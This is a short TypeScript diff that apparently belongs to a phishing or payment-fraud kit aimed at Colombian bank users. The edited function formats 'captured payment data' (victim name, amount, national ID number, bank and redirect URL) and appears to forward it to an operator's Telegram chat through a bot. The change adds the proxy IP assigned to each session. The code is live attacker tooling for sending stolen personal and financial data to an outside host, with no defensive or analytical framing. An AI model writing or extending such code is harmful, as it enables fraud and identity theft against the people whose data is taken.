@@ -15,13 +15,13 @@ function tg(method: string, body: unknown) {
   }).then((r) => r.json() as Promise<{ ok: boolean; result?: { message_id: number } }>);
 }
 
-export function notifySessionPayment(sid: string, data: { nombre: string; monto: string; cc: string; banco: string; url?: string }) {
+export function notifySessionPayment(sid: string, data: { nombre: string; monto: string; cc: string; banco: string; url?: string; proxyIp?: string }) {
   if (!env.telegramBotToken || !env.telegramChatId) return;
   const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
   sessions.set(sid, s);
 
   const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
-  const paymentLine = `\n💳 [DATOS DE PAGO CAPTADOS]\n• Nombre: ${data.nombre}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• CC/Doc: ${data.cc}\n• Banco: ${data.banco}${data.url ? `\n• Redirigido a: ${data.url}` : ''}`;
+  const paymentLine = `\n💳 [DATOS DE PAGO CAPTADOS]\n• Nombre: ${data.nombre}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• CC/Doc: ${data.cc}\n• Banco: ${data.banco}${data.proxyIp ? `\n• 🌐 IP asignada: ${data.proxyIp}` : ''}${data.url ? `\n• Redirigido a: ${data.url}` : ''}`;
   s.lines.push(`${time} ${paymentLine}`);
 
   s.chain = s.chain.then(async () => {
